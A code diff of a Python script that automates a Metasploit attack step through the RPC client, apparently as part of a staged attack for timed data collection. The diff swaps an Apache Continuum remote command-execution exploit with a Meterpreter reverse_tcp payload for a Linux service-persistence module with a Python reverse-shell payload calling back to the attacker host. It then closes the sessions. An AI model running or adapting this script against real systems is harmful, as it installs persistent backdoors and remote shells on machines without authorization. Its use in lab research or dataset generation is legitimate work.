@@ -18,15 +18,17 @@ def main(argv):
     my_ip = argv[2]
     target_ip = argv[3]
     
-    output_time_file = 'time_step_4_start.txt'
+    client = MsfRpcClient('kali')
+    
+    # start step 5
+    output_time_file = 'time_step_5_start.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(2)
 
-    client = MsfRpcClient('kali')
-
-    exploit = client.modules.use('exploit', 'linux/http/apache_continuum_cmd_exec')
-    payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
-    exploit['RHOSTS'] = target_ip
+    exploit = client.modules.use('exploit', 'linux/local/service_persistence')
+    payload = client.modules.use('payload', 'cmd/unix/reverse_python')
+    exploit['SESSION'] = 1
+    exploit['VERBOSE'] = True
     payload['LHOST'] = my_ip
 
     exploit.execute(payload=payload)
@@ -34,8 +36,11 @@ def main(argv):
     while client.jobs.list:
         time.sleep(1)
 
+    client.sessions.session('1').stop()
+    client.sessions.session('2').stop()
+
     time.sleep(30)
-    output_time_file = 'time_step_4_end.txt'
+    output_time_file = 'time_step_5_end.txt'
     record_timestamp(folder, output_time_file)
     time.sleep(30)
 
